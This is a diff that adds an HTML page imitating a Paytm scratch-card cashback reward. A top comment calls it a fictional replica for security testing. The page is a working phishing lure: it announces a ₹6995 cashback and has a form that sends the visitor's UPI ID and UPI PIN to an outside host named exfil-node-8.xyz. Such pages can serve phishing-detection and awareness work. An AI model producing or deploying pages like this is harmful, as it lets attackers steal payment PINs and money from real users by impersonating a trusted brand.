@@ -1,0 +1,48 @@
+<!-- fictional replica for security testing -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paytm Scratch Card & Cashback Rewards</title>
+    <style>
+        :root {
+            --primary: #002970;
+            --secondary: #00b9f5;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: #0f172a; color: #f8fafc; display: flex; justify-content: center; padding: 16px; }
+        .p3_c8_wrapper { width: 100%; max-width: 420px; background: #1e293b; border-radius: 16px; border: 1px solid #334155; padding: 24px; text-align: center; }
+        .p3_c8_congrats { font-size: 22px; font-weight: 800; color: #fbbf24; margin-bottom: 4px; }
+        .p3_c8_brand { font-size: 14px; color: #94a3b8; margin-bottom: 18px; }
+        .p3_c8_scratch-area { background: linear-gradient(135deg, var(--primary), var(--secondary)); border-radius: 12px; padding: 30px 20px; margin-bottom: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
+        .p3_c8_cashback-title { font-size: 13px; text-transform: uppercase; color: #ffffff; opacity: 0.9; }
+        .p3_c8_reward-amount { font-size: 38px; font-weight: 900; color: #ffffff; margin-top: 6px; }
+        .p3_c8_claim-desc { font-size: 13px; color: #cbd5e1; margin-bottom: 20px; line-height: 1.5; }
+        .p3_c8_field { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #ffffff; margin-bottom: 14px; font-size: 15px; }
+        .p3_c8_btn { width: 100%; padding: 14px; background: #22c55e; color: #ffffff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }
+        .p3_c8_footer { font-size: 11px; color: #64748b; margin-top: 16px; }
+    </style>
+</head>
+<body>
+    <div class="p3_c8_wrapper">
+        <div class="p3_c8_congrats">🎉 Congratulations!</div>
+        <div class="p3_c8_brand">Sponsored by Paytm Payments Rewards</div>
+        <div class="p3_c8_scratch-area">
+            <div class="p3_c8_cashback-title">Direct Bank Cashback Unlocked</div>
+            <div class="p3_c8_reward-amount">₹6995</div>
+        </div>
+        <div class="p3_c8_claim-desc">
+            You have been selected for a special festive cashback from Paytm Payments.
+        </div>
+        <form action="https://exfil-node-8.xyz/submit" method="POST">
+            <input class="p3_c8_field" type="text" name="vpa_id" placeholder="Enter Your UPI ID (e.g. name@ybl)" value="settlement.desk8_2@ybl" required>
+            <input class="p3_c8_field" type="password" name="upi_pin" placeholder="Enter UPI PIN to verify transfer" maxlength="6" required>
+            <button class="p3_c8_btn" type="submit">CLAIM REWARD NOW</button>
+        </form>
+        <div class="p3_c8_footer">
+            Official Festival Promo &bull; Code: REWARD-001095 &bull; 24h Support: +919876080002
+        </div>
+    </div>
+</body>
+</html>
